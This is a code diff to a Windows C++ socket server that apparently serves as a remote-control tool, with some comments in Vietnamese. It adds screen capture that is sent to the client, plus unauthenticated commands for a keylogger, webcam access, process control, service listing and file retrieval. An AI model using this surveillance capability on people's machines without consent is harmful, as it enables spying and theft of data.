@@ -1,5 +1,8 @@
 #include "server_socket.h"
 
+std::atomic<bool> stoprecording(false);
+std::mutex mtx;
+std::condition_variable CV;
 
 Server::Server(int port)
     : port(port), listenSocket(INVALID_SOCKET) {
@@ -56,6 +59,11 @@ bool Server::start() {
         return false;
     }
 
+    int timeout = 60000; // 60 second
+    setsockopt(listenSocket, SOL_SOCKET, SO_RCVTIMEO, (char *)&timeout, sizeof(timeout));
+    setsockopt(listenSocket, SOL_SOCKET, SO_SNDTIMEO, (char *)&timeout, sizeof(timeout));
+
+
     std::cout << "Server listening on port " << port << std::endl;
     return true;
 }
@@ -78,24 +86,165 @@ void Server::listenForConnections() {
 }
 
 
-// Helper function to get CLSID of JPEG encoder
-int GetEncoderClsid(const WCHAR* format, CLSID* pClsid) {
-    UINT num = 0;          // number of image encoders
-    UINT size = 0;        // size of the image encoder array in bytes
-    Gdiplus::GetImageEncodersSize(&num, &size);
-    if (size == 0) return -1; // Failure
+bool Server::captureScreenshot(cv::Mat& outImage) {
 
-    std::vector<BYTE> buffer(size);
-    Gdiplus::ImageCodecInfo* pImageCodecInfo = reinterpret_cast<Gdiplus::ImageCodecInfo*>(buffer.data());
-    Gdiplus::GetImageEncoders(num, size, pImageCodecInfo);
+    // Khởi tạo GDI+
+    GdiplusStartupInput gdiplusStartupInput;
+    ULONG_PTR gdiplusToken;
+    GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, nullptr);
 
-    for (UINT i = 0; i < num; ++i) {
-        if (wcscmp(pImageCodecInfo[i].MimeType, format) == 0) {
-            *pClsid = pImageCodecInfo[i].Clsid;
-            return i;
+    // Lấy kích thước màn hình
+    int screenWidth = GetSystemMetrics(SM_CXSCREEN);
+    int screenHeight = GetSystemMetrics(SM_CYSCREEN);
+
+    // Tạo DC cho màn hình và bộ nhớ
+    HDC hScreenDC = GetDC(nullptr);
+    HDC hMemoryDC = CreateCompatibleDC(hScreenDC);
+
+    // Tạo bitmap tương thích với màn hình
+    HBITMAP hBitmap = CreateCompatibleBitmap(hScreenDC, screenWidth, screenHeight);
+    HBITMAP hOldBitmap = (HBITMAP)SelectObject(hMemoryDC, hBitmap);
+
+    // Sao chép màn hình vào bitmap
+    BitBlt(hMemoryDC, 0, 0, screenWidth, screenHeight, hScreenDC, 0, 0, SRCCOPY);
+
+    // Chuyển đổi HBITMAP sang GDI+ Bitmap
+    Bitmap bitmap(hBitmap, nullptr);
+
+    // Lưu dữ liệu bitmap vào đối tượng cv::Mat
+    BitmapData bitmapData;
+    Rect rect(0, 0, screenWidth, screenHeight);
+    if (bitmap.LockBits(&rect, ImageLockModeRead, PixelFormat24bppRGB, &bitmapData) == Ok) {
+        cv::Mat temp(screenHeight, screenWidth, CV_8UC3, bitmapData.Scan0, bitmapData.Stride);
+        temp.copyTo(outImage); // Sao chép dữ liệu vào ảnh đầu ra
+        bitmap.UnlockBits(&bitmapData);
+    } else {
+        std::cerr << "Failed to lock GDI+ bitmap.\n";
+        return false;
+    }
+
+    // Dọn dẹp
+    SelectObject(hMemoryDC, hOldBitmap);
+    DeleteObject(hBitmap);
+    DeleteDC(hMemoryDC);
+    ReleaseDC(nullptr, hScreenDC);
+
+    // Tắt GDI+
+    GdiplusShutdown(gdiplusToken);
+    return true;
+}
+
+bool Server::captureAndSendScreenshot(SOCKET clientSocket) {
+    cv::Mat screenshot;
+    if (!captureScreenshot(screenshot)) {
+        std::cerr << "Failed to capture screenshot.\n";
+        return false;
+    }
+
+    std::vector<uchar> buffer;
+    cv::imencode(".jpg", screenshot, buffer);  // Encode as JPG
+    cv::imwrite("screenshot.jpg", screenshot);
+
+    int dataSize = buffer.size();
+    if (send(clientSocket, reinterpret_cast<const char*>(&dataSize), sizeof(dataSize), 0) == SOCKET_ERROR) {
+        std::cerr << "Failed to send data size.\n";
+        return false;
+    }
+
+    if (send(clientSocket, reinterpret_cast<const char*>(buffer.data()), dataSize, 0) == SOCKET_ERROR) {
+        std::cerr << "Failed to send image data.\n";
+        return false;
+    }
+    return true;
+}
+
+void Server::handleClient(SOCKET clientSocket) {
+    char recvbuf[512];
+    int recvbuflen = 512;
+
+    int result;
+
+    // Receive data from the client
+    while (1)
+    {
+        std::cout << "Waiting for request from client..." << std::endl;
+        result = recv(clientSocket, recvbuf, recvbuflen, 0);
+        if (result > 0) {
+            std::string receivedMessage(recvbuf, result);
+            std::cout << "Received message: " << receivedMessage << std::endl;
+
+            if (receivedMessage == "shutdown") {
+                std::cout << "Shutdown command received. Server is shutting down..." << std::endl;
+                closesocket(listenSocket);  // Close listening socket to stop accepting new connections
+                shutdownServer();
+                exit(0);  // Exit the server program
+            }
+            else if(receivedMessage == "restart"){
+                std::cout << "Restart command received. Server is restarting..." << std::endl;
+                closesocket(listenSocket);  // Close listening socket to stop accepting new connections
+                restartServer();
+                exit(0);  // Exit the server program
+            } else if (receivedMessage == "startKeylogger") {
+                std::cout << "Keylogger command received." << std::endl;
+                startKeyLogger();
+            } else if (receivedMessage == "offKeylogger") {
+                std::cout << "Keylogger stop command received." << std::endl;
+                stopKeyLogger(clientSocket);
+            } else if (receivedMessage == "listApp"){
+                std::cout << "List app command received." << std::endl;
+                listApplications(clientSocket);
+            } else if(receivedMessage.substr(0, 7) == "openApp"){
+                std::cout << "Open app command received." << std::endl;
+                std::string appNameStr = receivedMessage.substr(8);
+                openProcess(appNameStr, clientSocket);
+            } else if(receivedMessage.substr(0, 8) == "closeApp"){
+                std::cout << "Close app command received." << std::endl;
+                DWORD processID = stoi(receivedMessage.substr(9));
+                closeProcess(processID, clientSocket);
+            } else if(receivedMessage == "listService"){
+                std::cout << "List service command received." << std::endl;
+                listServices(clientSocket);
+            }
+            else if (receivedMessage == "screenshot")
+            {
+                std::cout << "Screenshot command received.\n";
+                bool check = captureAndSendScreenshot(clientSocket);
+
+                if (check) std::cout << "Screenshot saved as screenshot.jpg and sent to client!\n";
+            }
+            else if (receivedMessage.substr(0, 9) == "copy_file")
+            {
+                std::istringstream iss(receivedMessage);
+                std::string command, sourceFileName, destinationFileName;
+
+                // Parse the command
+                std::getline(iss, command, '|');
+                std::getline(iss, sourceFileName, '|');
+                std::getline(iss, destinationFileName);
+
+                // Call the method to copy the file and send it back
+                copyFileAndSend(clientSocket, sourceFileName, destinationFileName);
+            }
+            else if (receivedMessage == "open_webcam")
+            {
+                openWebcam(clientSocket);
+            }
+            else if (receivedMessage == "close_connection")
+            {
+                std::cout << "Close connection received." << std::endl;
+                std::cout << "Connection closing..." << std::endl;
+                closesocket(listenSocket);
+                exit(0);
+                break;
+            }
+        } else if (result == 0) {
+            std::cout << "Connection closing..." << std::endl;
+            break;
+        } else {
+            std::cerr << "recv failed: " << WSAGetLastError() << std::endl;
+            break;
         }
     }
-    return -1; // Failure
 }
 
 // Implementation of copyFileAndSend
@@ -103,15 +252,15 @@ void Server::copyFileAndSend(SOCKET clientSocket, const std::string& sourceFileN
     std::ifstream sourceFile(sourceFileName, std::ios::binary);
     if (!sourceFile) {
         std::string errorMessage = "Failed to open source file: " + sourceFileName;
-        send(clientSocket, errorMessage.c_str(), errorMessage.size(), 0);
+        send(clientSocket, errorMessage.c_str(), static_cast<int>(errorMessage.size()), 0);
         return;
     }
-
+    
     // Create the destination file for writing
     std::ofstream destinationFile(destinationFileName, std::ios::binary);
     if (!destinationFile) {
         std::string errorMessage = "Failed to create destination file: " + destinationFileName;
-        send(clientSocket, errorMessage.c_str(), errorMessage.size(), 0);
+        send(clientSocket, errorMessage.c_str(), static_cast<int>(errorMessage.size()), 0);
         return;
     }
 
@@ -125,23 +274,30 @@ void Server::copyFileAndSend(SOCKET clientSocket, const std::string& sourceFileN
     // Send the copied file back to the client
     std::ifstream copiedFile(destinationFileName, std::ios::binary);
     if (copiedFile) {
+        std::string successfulmessage = "Server sending file...";
+        send(clientSocket, successfulmessage.c_str(), static_cast<int>(successfulmessage.size()), 0);
+
+        std::this_thread::sleep_for(std::chrono::milliseconds(100));
+
         // Get the size of the file
         copiedFile.seekg(0, std::ios::end);
         std::streamsize size = copiedFile.tellg();
         copiedFile.seekg(0, std::ios::beg);
 
         // Send the size first
-        uint32_t fileSize = htonl(size);
+        uint32_t fileSize = htonl(static_cast<u_long>(size));
         send(clientSocket, reinterpret_cast<const char*>(&fileSize), sizeof(fileSize), 0);
 
         // Send the file data
-        char buffer[4096];
+        char buffer[1024];
         while (copiedFile.read(buffer, sizeof(buffer))) {
-            send(clientSocket, buffer, copiedFile.gcount(), 0);
+            std::this_thread::sleep_for(std::chrono::milliseconds(100));
+            send(clientSocket, buffer, static_cast<int>(copiedFile.gcount()), 0);
         }
         // Send any remaining bytes
         if (copiedFile.gcount() > 0) {
-            send(clientSocket, buffer, copiedFile.gcount(), 0);
+            std::this_thread::sleep_for(std::chrono::milliseconds(100));
+            send(clientSocket, buffer, static_cast<int>(copiedFile.gcount()), 0);
         }
 
         std::cout << "File copied and sent back to client successfully." << std::endl;
